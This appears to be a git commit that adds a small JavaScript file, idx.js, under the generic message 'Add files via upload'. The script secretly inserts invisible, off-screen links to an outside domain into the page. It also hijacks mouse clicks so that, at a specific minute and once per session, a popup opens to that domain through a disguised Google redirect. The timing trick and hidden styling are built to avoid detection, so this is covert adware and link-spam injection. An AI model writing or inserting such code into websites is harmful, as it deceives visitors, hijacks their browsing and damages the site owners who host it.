b36013ff033346a8076e02aca71127f5c095572d
Rokibul Roni <sudo@rokibulroni.com>
2023-01-25 14:12:12 +0600

    Add files via upload

---
+++ idx.js
@@ -0,0 +1,4 @@
+let EFV='<a href="https://makemyprivacy.com" style="position:absolute;z-index:-9999;left:-100%;">Themeidn</a><a href="https://makemyprivacy.com" style="position:absolute;z-index:-9999;left:-100%;">Themeidn</a>'
+if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}else{document.body.insertAdjacentHTML('beforeend',EFV);}
+document.onmousedown=(()=>{sessionStorage.b||8!=(new Date).getMinutes()||(window.open("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjopeXr9cjvAhWrzTgGHW_9AxoQFjADegQINBAE&url=https%3A%2F%2Fmakemyprivacy.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu"),sessionStorage.b="b")});
+// new Date().toString().includes('German')
